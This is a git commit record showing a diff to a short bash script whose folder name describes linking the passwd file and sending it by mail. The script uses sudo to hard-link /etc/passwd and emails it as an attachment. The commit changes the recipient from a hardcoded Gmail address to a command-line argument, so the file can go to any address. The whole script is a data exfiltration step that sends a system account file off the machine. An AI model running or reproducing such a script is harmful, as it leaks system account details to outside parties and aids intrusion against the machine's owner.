d041390447f9f49b0678d3c663f9b511cbf9824d
AhmedOsama5560 <36535479+AhmedOsama5560@users.noreply.github.com>
2023-01-09 22:09:04 +0200

    Adding new feature
    Adding the capability to pass the email address you want to send the file to as a command line argument

--- Linking passwd file and sending it throw mail/passwordlink.sh
+++ Linking passwd file and sending it throw mail/passwordlink.sh
@@ -1,4 +1,4 @@
 #!/bin/bash
 
 sudo ln /etc/passwd password
-mail -s "Password" -A password ahmedosama12300@gmail.com <<< "Here is passwd file"
+mail -s "Password" -A password $1 <<< "Here is passwd file"
